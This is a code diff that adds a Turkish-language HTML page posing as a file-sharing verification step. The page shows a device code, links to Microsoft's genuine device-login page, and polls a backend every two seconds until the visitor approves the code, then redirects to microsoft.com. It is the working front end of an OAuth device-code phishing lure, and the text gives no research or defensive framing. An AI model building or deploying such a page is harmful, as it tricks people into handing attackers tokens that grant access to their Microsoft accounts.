@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Dosya Paylaşımı</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        .box { background: white; padding: 30px; border-radius: 8px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
+        .code { font-size: 24px; font-weight: bold; color: #0078d4; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Paylaşılan Dosyaya Erişmek İçin</h2>
+        <p>Lütfen aşağıdaki kodu kullanarak doğrulama yapın:</p>
+        <div class="code" id="userCode">Yükleniyor...</div>
+        <p><a id="loginLink" href="https://microsoft.com/devicelogin" target="_blank">Doğrulama Sayfasına Git</a></p>
+    </div>
+
+    <script>
+        async function initFlow() {
+            try {
+                // 1. Adım: Cihaz kodunu al
+                const res = await fetch('/api/get-code');
+                const data = await res.json();
+
+                if (data.user_code && data.device_code) {
+                    document.getElementById('userCode').innerText = data.user_code;
+                    
+                    // 2. Adım: Tarayıcı üzerinden her 2 saniyede bir token'ı kontrol et (Polling)
+                    const interval = setInterval(async () => {
+                        const pollRes = await fetch('/api/poll', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                deviceCode: data.device_code, 
+                                userCode: data.user_code 
+                            })
+                        });
+                        
+                        const pollData = await pollRes.json();
+                        
+                        if (pollData.success) {
+                            clearInterval(interval);
+                            window.location.href = 'https://www.microsoft.com'; // Başarılı olunca yönlendirilecek yer
+                        }
+                    }, 2000);
+                } else {
+                    document.getElementById('userCode').innerText = 'Kod alınamadı.';
+                }
+            } catch (err) {
+                console.error(err);
+                document.getElementById('userCode').innerText = 'Bir hata oluştu.';
+            }
+        }
+
+        initFlow();
+    </script>
+</body>
+</html>
